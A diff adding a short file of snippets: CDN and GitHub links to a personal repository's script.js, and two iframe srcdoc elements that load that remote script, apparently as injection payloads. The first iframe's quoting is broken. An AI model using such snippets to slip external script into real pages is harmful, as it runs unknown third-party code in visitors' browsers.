@@ -1,0 +1,6 @@
+https://cdn.jsdelivr.net/gh/Jean-baptisteViossi/juan@main/script.js
+<iframe srcdoc="<script src="https://cdn.jsdelivr.net/gh/Jean-baptisteViossi/juan@main/script.js" ></script>"></iframe>
+
+https://github.com/Jean-baptisteViossi/juan/blob/main/script.js
+
+<iframe width="600" height="400" srcdoc='<!DOCTYPE html><html><head><meta charset="utf-8"><script src="https://cdn.jsdelivr.net/gh/Jean-baptisteViossi/juan@main/script.js"></script></head><body></body></html>'></iframe>
